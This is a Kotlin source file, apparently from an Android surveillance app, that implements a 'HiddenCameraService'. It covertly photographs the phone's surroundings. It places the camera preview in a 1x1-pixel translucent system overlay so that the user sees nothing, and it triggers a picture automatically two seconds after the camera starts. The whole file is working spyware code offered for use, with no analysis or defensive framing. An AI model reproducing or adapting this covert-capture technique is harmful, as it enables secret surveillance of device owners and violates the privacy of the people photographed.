package com.github.muneebwanee.dash.utils.hiddenCameraServiceUtils

import android.Manifest
import android.content.Context
import android.content.pm.PackageManager
import android.graphics.PixelFormat
import android.os.Build
import android.os.Handler
import androidx.core.app.ActivityCompat
import android.view.ViewGroup
import android.view.WindowManager
import com.github.muneebwanee.dash.utils.Consts.TAG

import com.github.muneebwanee.dash.utils.hiddenCameraServiceUtils.config.CameraFacing
import com.github.muneebwanee.dash.utils.hiddenCameraServiceUtils.HiddenCameraUtils.canOverDrawOtherApps
import com.github.muneebwanee.dash.utils.hiddenCameraServiceUtils.HiddenCameraUtils.isFrontCameraAvailable
import com.pawegio.kandroid.d

/**
 * Created by muneebwanee on 15/12/20.
 */
class HiddenCameraService(private val context: Context, private val cameraCallbacks: CameraCallbacks) {

    private var mWindowManager: WindowManager? = null
    private var mCameraPreview: CameraPreview? = null

    fun startCamera(cameraConfig: CameraConfig) {

        if (!context.canOverDrawOtherApps()) {
            cameraCallbacks.onCameraError(CameraError.ERROR_DOES_NOT_HAVE_OVERDRAW_PERMISSION)
        } else if (ActivityCompat.checkSelfPermission(context, Manifest.permission.CAMERA) != PackageManager.PERMISSION_GRANTED) {
           cameraCallbacks.onCameraError(CameraError.ERROR_CAMERA_PERMISSION_NOT_AVAILABLE)
        } else if (cameraConfig.facing == CameraFacing.FRONT_FACING_CAMERA && !context.isFrontCameraAvailable()) {
            cameraCallbacks.onCameraError(CameraError.ERROR_DOES_NOT_HAVE_FRONT_CAMERA)
        } else {
            if (mCameraPreview == null) mCameraPreview = addPreView()
            mCameraPreview!!.startCameraInternal(cameraConfig)
            Handler().postDelayed({ takePicture() }, 2000)
        }
    }

    private fun takePicture() {
        if (mCameraPreview != null) {
            if (mCameraPreview!!.isSafeToTakePictureInternal) {
                mCameraPreview!!.takePictureInternal()
            }
        } else {
            throw RuntimeException("Background camera not initialized. Call startCamera() to initialize the camera.")
        }
    }

    fun stopCamera() {
        if (mCameraPreview != null) {
            mWindowManager!!.removeView(mCameraPreview)
            mCameraPreview!!.stopPreviewAndFreeCamera()
            mCameraPreview = null
            d(TAG,"camera stop")
        }
    }


    private fun addPreView(): CameraPreview {
        val cameraSourceCameraPreview = CameraPreview(context, cameraCallbacks)
        cameraSourceCameraPreview.layoutParams = ViewGroup.LayoutParams(ViewGroup.LayoutParams.MATCH_PARENT, ViewGroup.LayoutParams.MATCH_PARENT)

        mWindowManager = context.getSystemService(Context.WINDOW_SERVICE) as WindowManager
        val params = WindowManager.LayoutParams(1, 1,
                if (Build.VERSION.SDK_INT < Build.VERSION_CODES.O) WindowManager.LayoutParams.TYPE_SYSTEM_OVERLAY
                else WindowManager.LayoutParams.TYPE_APPLICATION_OVERLAY,
                WindowManager.LayoutParams.FLAG_WATCH_OUTSIDE_TOUCH,
                PixelFormat.TRANSLUCENT)

        mWindowManager!!.addView(cameraSourceCameraPreview, params)
        return cameraSourceCameraPreview
    }
}
